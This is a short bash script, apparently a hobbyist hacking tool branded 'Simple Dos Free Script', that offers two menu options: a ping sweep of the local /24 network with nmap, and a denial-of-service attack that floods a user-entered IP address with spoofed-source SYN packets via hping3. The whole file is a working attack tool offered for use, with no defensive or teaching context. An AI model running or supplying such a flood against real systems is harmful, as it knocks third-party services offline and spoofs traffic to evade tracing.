#!/bin/bash
red='\033[0;31m'
NC='\033[0m'
cyan='\033[0;36m'
echo -e """${red}
▓█████▓██   ██▓▓█████ 
▓█   ▀ ▒██  ██▒▓█   ▀ 
▒███    ▒██ ██░▒███   
▒▓█  ▄  ░ ▐██▓░▒▓█  ▄ 
░▒████▒ ░ ██▒▓░░▒████▒
░░ ▒░ ░  ██▒▒▒ ░░ ▒░ ░
 ░ ░  ░▓██ ░▒░  ░ ░  ░
   ░   ▒ ▒ ░░     ░   
   ░  ░░ ░        ░  ░
       ░ ░            

[ iG: @1zsb, Github: 0xffvirus ]

[ Simple Dos Free Script ]
"""
echo -e "${cyan}[1] Scan Devices in Network"
echo -e "[2] Dos IP ADDRESS"
echo -n -e "${NC}Option : " & read opt
if [ "$opt" == "1" ]; then
	echo -e "=============SCANNING DEVICES============="
	GAT=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
	nmap $GAT/24 -n -sP
elif [ "$opt" == "2" ]; then
	echo -e "=============DOS IP ADDRESS============="
	echo -n -e "Target: " && read ip
	hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $ip
else
echo "[?] Try Again"
fi
